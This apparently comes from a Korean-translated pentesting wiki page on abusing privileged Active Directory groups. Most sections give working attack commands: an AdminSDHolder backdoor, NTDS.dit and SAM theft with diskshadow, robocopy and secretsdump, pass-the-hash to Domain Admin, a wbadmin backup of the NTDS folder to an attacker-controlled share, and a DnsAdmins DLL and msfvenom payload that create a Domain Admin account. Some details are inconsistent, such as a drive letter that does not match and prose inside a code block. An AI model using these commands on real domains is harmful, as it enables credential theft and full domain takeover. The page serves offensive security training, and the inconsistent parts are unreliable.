# 특권 그룹

{{#include ../../banners/hacktricks-training.md}}

## 관리 권한이 있는 잘 알려진 그룹

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 그룹은 도메인에서 관리자가 아닌 계정과 그룹을 생성할 수 있는 권한을 가집니다. 또한 도메인 컨트롤러(DC)에 대한 로컬 로그인을 허용합니다.

이 그룹의 멤버를 식별하려면 다음 명령을 실행합니다:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새 사용자를 추가하는 것과 DC에 대한 로컬 로그인이 허용됩니다.

## AdminSDHolder 그룹

The **AdminSDHolder** 그룹의 Access Control List (ACL)은 Active Directory 내의 모든 "protected groups" — 특히 high-privilege groups — 에 대한 권한을 설정하므로 매우 중요합니다. 이 메커니즘은 무단 수정으로부터 해당 그룹들을 보호하여 보안을 유지합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 일반 사용자에게 전체 권한을 부여하는 방식으로 이를 악용할 수 있습니다. 이렇게 되면 해당 사용자는 모든 protected groups에 대해 사실상 전체 제어 권한을 갖게 됩니다. 만약 이 사용자의 권한이 변경되거나 제거되더라도, 시스템 설계상 약 1시간 내에 자동으로 복원됩니다.

멤버를 확인하고 권한을 수정하기 위한 명령어는 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
복구 과정을 가속화하기 위한 스크립트가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 참조하세요.

## AD Recycle Bin

이 그룹에 대한 멤버십은 삭제된 Active Directory 객체를 읽을 수 있는 권한을 부여하며, 이는 민감한 정보를 노출시킬 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Access

DC의 파일 접근은 사용자가 `Server Operators` 그룹의 구성원이 아닌 경우 제한되며, 해당 그룹에 속하면 접근 권한 수준이 변경됩니다.

### Privilege Escalation

Sysinternals의 `PsService`나 `sc`를 사용하면 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대해 전체 제어 권한을 가지며, 임의 명령 실행과 privilege escalation을 가능하게 합니다:
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 전체 접근 권한을 가지고 있어 권한 상승을 위해 서비스를 조작할 수 있음을 보여준다.

## Backup Operators

`Backup Operators` 그룹의 구성원은 `SeBackup` 및 `SeRestore` 권한으로 인해 `DC01` 파일 시스템에 접근할 수 있다. 이 권한들은 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용하여 명시적 권한이 없어도 폴더 탐색, 목록 확인 및 파일 복사 기능을 가능하게 한다. 이 프로세스에는 특정 스크립트 사용이 필요하다.

그룹 멤버를 나열하려면 다음을 실행:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 로컬 공격

이러한 권한을 로컬에서 활용하려면 다음 단계를 수행합니다:

1. 필요한 라이브러리 가져오기:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉터리에서 파일에 접근하고 복사합니다. 예를 들면:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller의 파일 시스템에 직접 접근하면 도메인 사용자 및 컴퓨터의 모든 NTLM 해시를 포함하는 `NTDS.dit` 데이터베이스를 탈취할 수 있습니다.

#### Using diskshadow.exe

1. `C` 드라이브의 섀도 복사본을 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 섀도 복사본에서 `NTDS.dit` 복사:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
대신 파일 복사에는 `robocopy`를 사용하세요:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 획득을 위해 `SYSTEM` 및 `SAM`을 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 hashes를 추출하기:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 추출 후: Pass-the-Hash to DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe 사용하기

1. 공격자 머신에서 SMB 서버용 NTFS 파일시스템을 설정하고 대상 머신에서 SMB 자격증명을 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출을 위해 `wbadmin.exe`를 사용하세요:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

DnsAdmins 그룹의 구성원을 나열하려면 다음을 사용하세요:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의 DLL 실행 (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점은 DNS 서비스(보통 DCs 내부)에서 SYSTEM 권한으로 임의 코드를 실행할 수 있게 합니다. 이 문제는 2021년에 수정되었습니다.

구성원들은 DNS 서버가 임의의 DLL(로컬이거나 remote share에서)을 로드하도록 다음과 같은 명령을 사용하여 만들 수 있습니다:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL이 로드되려면 DNS 서비스를 재시작해야 합니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
For more details on this attack vector, refer to ired.team.

#### Mimilib.dll

mimilib.dll을 사용해 명령을 실행하는 것도 가능하며, 특정 명령이나 reverse shells를 실행하도록 수정할 수 있습니다. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)에서 자세한 정보를 확인하세요.

### WPAD Record for MitM

DnsAdmins는 글로벌 쿼리 차단 목록을 비활성화한 후 WPAD 레코드를 생성하여 Man-in-the-Middle (MitM) 공격을 수행하기 위해 DNS 레코드를 조작할 수 있습니다. Responder나 Inveigh 같은 도구를 사용해 스푸핑하고 네트워크 트래픽을 캡처할 수 있습니다.

### Event Log Readers
구성원은 이벤트 로그에 접근할 수 있어 plaintext passwords나 명령 실행 세부사항과 같은 민감한 정보를 발견할 수 있습니다:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows 권한

이 그룹은 도메인 객체의 DACLs를 수정할 수 있어 DCSync 권한을 잠재적으로 부여할 수 있습니다. 이 그룹을 악용한 권한 상승 기법은 Exchange-AD-Privesc GitHub repo에 자세히 설명되어 있습니다.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 관리자

Hyper-V 관리자에게는 Hyper-V에 대한 전체 액세스 권한이 있어 가상화된 도메인 컨트롤러를 제어하는 데 악용될 수 있습니다. 여기에는 라이브 DC 복제와 NTDS.dit 파일에서 NTLM 해시를 추출하는 것이 포함됩니다.

### 악용 예시

Firefox의 Mozilla Maintenance Service는 Hyper-V 관리자에 의해 SYSTEM 권한으로 명령을 실행하기 위해 악용될 수 있습니다. 이는 보호된 SYSTEM 파일에 하드 링크를 생성하고 이를 악성 실행 파일로 교체하는 작업을 포함합니다:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
참고: 최근 Windows 업데이트에서 Hard link exploitation이 완화되었습니다.

## Group Policy Creators Owners

이 그룹은 구성원에게 도메인에서 Group Policies를 생성할 수 있는 권한을 부여합니다. 그러나 구성원은 사용자나 그룹에 Group Policies를 적용하거나 기존 GPOs를 편집할 수는 없습니다.

## Organization Management

Microsoft Exchange가 배포된 환경에서는 **Organization Management**라는 특별한 그룹이 중요한 권한을 가집니다. 이 그룹은 **도메인 내 모든 사용자의 사서함에 접근할 수 있는 권한**을 보유하며, **'Microsoft Exchange Security Groups'** Organizational Unit(OU)에 대한 **완전한 제어권**을 유지합니다. 이 제어권에는 권한 상승에 악용될 수 있는 **`Exchange Windows Permissions`** 그룹이 포함됩니다.

### Privilege Exploitation and Commands

#### Print Operators

**Print Operators** 그룹의 구성원은 여러 권한을 부여받는데, 그중에는 `SeLoadDriverPrivilege`가 있어 **도메인 컨트롤러에 로컬로 로그온(log on locally)** 하고, 이를 종료(shut it down)하며 프린터를 관리할 수 있습니다. 이러한 권한을 악용하려면, 특히 비권한 상승 컨텍스트에서 `SeLoadDriverPrivilege`가 보이지 않는 경우 User Account Control (UAC)을 우회해야 합니다.

이 그룹의 구성원을 나열하려면, 다음 PowerShell 명령을 사용합니다:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
**`SeLoadDriverPrivilege`**와 관련된 보다 자세한 익스플로잇 기법은 관련 보안 자료를 참조하십시오.

#### 원격 데스크톱 사용자

이 그룹의 구성원은 Remote Desktop Protocol (RDP)을 통해 PC에 접근할 수 있는 권한을 가집니다. 해당 구성원을 열거하려면 PowerShell 명령을 사용할 수 있습니다:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP 악용에 대한 추가 정보는 전용 pentesting 자료에서 찾을 수 있습니다.

#### 원격 관리 사용자

멤버는 **Windows Remote Management (WinRM)**을 통해 PC에 접근할 수 있습니다. 이러한 멤버들의 열거는 다음을 통해 수행됩니다:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**과 관련된 악용 기법은 특정 문서를 참조해야 합니다.

#### Server Operators

이 그룹은 도메인 컨트롤러(Domain Controllers)에서 백업 및 복원 권한, 시스템 시간 변경, 시스템 종료 등을 포함한 다양한 구성을 수행할 권한을 가지고 있습니다. 멤버를 열거하려면 제공된 명령은 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 참고 자료 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
